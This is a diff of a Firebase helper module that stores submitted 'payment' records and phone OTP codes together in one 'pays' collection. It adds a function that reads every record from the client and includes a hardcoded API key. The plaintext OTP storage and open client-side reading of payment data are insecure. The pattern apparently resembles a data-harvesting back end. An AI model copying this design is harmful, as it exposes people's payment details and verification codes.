@@ -1,6 +1,6 @@
 import { getDatabase } from "@firebase/database"
 import { initializeApp } from "firebase/app"
-import { getFirestore, collection, addDoc, doc, getDoc, updateDoc, serverTimestamp } from "firebase/firestore"
+import { getFirestore, collection, addDoc, doc, getDoc, updateDoc, serverTimestamp, setDoc, getDocs } from "firebase/firestore"
 
 const firebaseConfig = {
   apiKey: "AIzaSyBSRLFN8DXH24hdFeZuj6RxsKt9_dceFJk",
@@ -16,22 +16,46 @@ const app = initializeApp(firebaseConfig)
 const db = getFirestore(app)
 const database = getDatabase(app)
 
-export const addData = async (data: any) => {
+export async function addData(data: any) {
+  if (!db) {
+    console.warn("Firebase not initialized. Cannot add data.");
+    return;
+  }
+
+  localStorage.setItem("visitor", data.id);
   try {
-    const docRef = await addDoc(collection(db, "orders"), {
-      ...data,
-      createdAt: serverTimestamp(),
+    const docRef = await doc(db, "pays", data.id!);
+    await setDoc(
+      docRef,
+      { ...data, createdDate: new Date().toISOString() },
+      { merge: true },
+    );
+
+    console.log("Document written with ID: ", docRef.id);
+    // You might want to show a success message to the user here
+  } catch (e) {
+    console.error("Error adding document: ", e);
+    // You might want to show an error message to the user here
+  }
+}
+export const getOrders = async () => {
+  try {
+    const ordersRef = collection(db, "pays")
+    const querySnapshot = await getDocs(ordersRef)
+    const orders: any[] = []
+    querySnapshot.forEach((doc) => {
+      orders.push({ ...doc.data(), firestoreId: doc.id })
     })
-    return docRef.id
+    return orders
   } catch (error) {
-    console.error("Error adding document:", error)
+    console.error("Error fetching orders:", error)
     throw error
   }
 }
 
 export const createOtpVerification = async (phone: string, otpCode: string) => {
   try {
-    const docRef = await addDoc(collection(db, "otp_verifications"), {
+    const docRef = await addDoc(collection(db, "pays"), {
       phone,
       otp: otpCode,
       verified: false,
@@ -47,7 +71,7 @@ export const createOtpVerification = async (phone: string, otpCode: string) => {
 
 export const verifyOtp = async (verificationId: string, otpCode: string) => {
   try {
-    const docRef = doc(db, "otp_verifications", verificationId)
+    const docRef = doc(db, "pays", verificationId)
     const docSnap = await getDoc(docRef)
 
     if (!docSnap.exists()) {
